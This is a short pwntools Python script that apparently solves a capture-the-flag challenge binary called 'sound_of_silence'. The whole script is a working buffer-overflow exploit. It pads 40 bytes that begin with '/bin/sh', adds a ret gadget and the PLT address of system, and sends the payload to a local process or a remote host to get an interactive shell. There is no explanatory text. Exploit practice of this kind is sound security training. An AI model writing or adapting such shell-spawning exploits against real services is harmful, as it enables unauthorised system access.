from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript='''
init-gef
b *0x401184
continue
'''.format(**locals())

exe = './sound_of_silence'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.terminal = 'kitty'

io = start()

offset = 40

payload = flat([
    b"/bin/sh\x00" + b"A" * (offset - len(b'/bin/sh\x00')),
    0x40101a,
    elf.plt.system 
])

io.sendline(payload)
io.interactive()
